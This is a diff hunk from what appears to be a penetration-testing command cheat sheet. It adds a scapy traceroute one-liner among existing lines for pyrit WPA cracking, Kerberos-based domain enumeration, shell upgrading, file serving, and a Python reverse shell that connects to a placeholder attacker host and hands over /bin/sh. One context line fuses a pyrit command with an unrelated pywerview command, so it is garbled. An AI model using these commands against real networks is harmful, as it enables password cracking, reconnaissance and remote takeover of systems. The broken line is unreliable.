@@ -2255,6 +2255,7 @@ pyrit -i wordlist.txt import_passwords
 pyrit -r capture.pcap -b $BSSID -i wordlist.txt attack_passthrough
 pyrit -r capture.pcap attack_dbKRB5CCNAME="ticket.ccache" pywerview get-netcomputer -k --dc-ip "$DC_IP" --user "$USERNAME "
 pyrit batch
+python3 -c "from scapy.all import* ; sn,unans=traceroute('<domain>',dport=[22,80,443,65123],retry=5,maxttl=64) ; sn.nsummary ; sn.graph(format='png',target='traceroute_scapy.png')"
 python -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<lhost>",<lport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 python -m SimpleHTTPServer 80
